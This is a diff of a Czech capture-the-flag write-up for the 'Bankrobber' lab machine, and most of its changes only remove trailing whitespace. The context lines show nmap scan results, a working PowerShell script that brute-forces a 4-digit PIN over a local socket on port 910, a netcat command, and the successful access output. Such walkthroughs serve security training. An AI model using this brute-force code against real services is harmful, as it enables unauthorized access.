@@ -22,12 +22,12 @@ IP=10.10.10.154;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d 
 ```
 PORT     STATE SERVICE      VERSION
 80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
 |_http-title: E-coin
 443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
 |_http-title: E-coin
@@ -41,7 +41,7 @@ PORT     STATE SERVICE      VERSION
 | MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
 |_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
 |_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
+| tls-alpn:
 |_  http/1.1
 445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
 3306/tcp open  mysql        MariaDB (unauthorized)
@@ -50,14 +50,14 @@ Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
 Host script results:
 |_clock-skew: mean: 55m24s, deviation: 0s, median: 55m24s
 |_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
-| smb-security-mode: 
+| smb-security-mode:
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
+| smb2-security-mode:
+|   2.02:
 |_    Message signing enabled but not required
-| smb2-time: 
+| smb2-time:
 |   date: 2019-11-28T20:28:48
 |_  start_date: 2019-11-28T20:22:49
 
@@ -120,7 +120,7 @@ Hopelessromantic
 - Zobrazení obsahu adresáře (spustitelné jen z localhost) (http://10.10.10.154/admin/backdoorchecker.php)
 - http://10.10.10.154/notes.txt
 ```
-- Move all files from the default Xampp folder: TODO
+- Move all files from the default Xampp folder.
 - Encode comments for every IP address except localhost: Done
 - Take a break..
 ```
@@ -277,32 +277,32 @@ PowerShell skript brute.ps1 připravíme do stejné složky jako nc.exe
 ```powershell
 [int] $Port = 910
 $IP = "127.0.0.1"
-$Address = [system.net.IPAddress]::Parse($IP) 
-$End = New-Object System.Net.IPEndPoint $address, $port 
+$Address = [system.net.IPAddress]::Parse($IP)
+$End = New-Object System.Net.IPEndPoint $address, $port
 $Stype = [System.Net.Sockets.SocketType]::Stream
 $Ptype = [System.Net.Sockets.ProtocolType]::TCP
 
 For ($i=0; $i -le 1000; $i++) {
 	$code = $i.ToString();
 	$bytecode = [system.Text.Encoding]::ASCII.GetBytes($code.PadLeft(4,"0")+"`n")
-	
-	$Sock = New-Object System.Net.Sockets.Socket $stype, $ptype 
+
+	$Sock = New-Object System.Net.Sockets.Socket $stype, $ptype
 	$sock.Connect($end)
 	Start-Sleep -Milliseconds 100
-	
+
 	$buf = new-object byte[] $Sock.Available
 	$receive = $Sock.Receive($buf)
-	
+
 	$Sent = $Sock.Send($bytecode)
 	Start-Sleep -Milliseconds 100
-	
+
 	$buf = new-object byte[] $Sock.Available
 	$receive = $Sock.Receive($buf);
 	if ($receive -gt 45){
 		"PIN: {0}" -f [System.Text.Encoding]::ASCII.GetString($bytecode)
 		return
 	}
-	
+
 	$Sock.Close()
 }
 ```
@@ -333,8 +333,8 @@ c:\windows\temp\nc.exe localhost 910
  [$] PIN is correct, access granted!
  --------------------------------------------------------------
  Please enter the amount of e-coins you would like to transfer:
- [$] 
- [$] Transfering $100 using our e-coin transfer application. 
+ [$]
+ [$] Transfering $100 using our e-coin transfer application.
  [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe
 
  [$] Transaction in progress, you can safely disconnect...
